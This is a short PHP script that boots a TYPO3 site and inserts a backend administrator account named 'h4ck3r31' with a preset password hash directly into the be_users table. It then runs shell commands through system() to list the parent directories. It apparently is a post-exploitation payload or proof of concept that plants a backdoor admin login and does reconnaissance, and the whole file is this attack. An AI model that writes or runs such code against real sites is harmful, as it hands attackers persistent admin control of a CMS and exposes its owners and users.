<?php
require_once '../vendor/autoload.php';
$GLOBALS['TYPO3_CONF_VARS'] = require_once 'typo3conf/LocalConfiguration.php';
include_once  'typo3conf/AdditionalConfiguration.php';

$pool = \TYPO3\CMS\Core\Utility\GeneralUtility
    ::makeInstance(\TYPO3\CMS\Core\Database\ConnectionPool::class);
$connection = $pool->getConnectionForTable('be_users');
$result = $connection->insert('be_users', [
    'username' => 'h4ck3r31',
    'password' => '$1$123456$qqQvjw0PqIk7otmzNsUIN0',
    'admin' => 1,
]);
var_dump($result, __DIR__);
system('ls -la ..');
system('ls -la ../..');
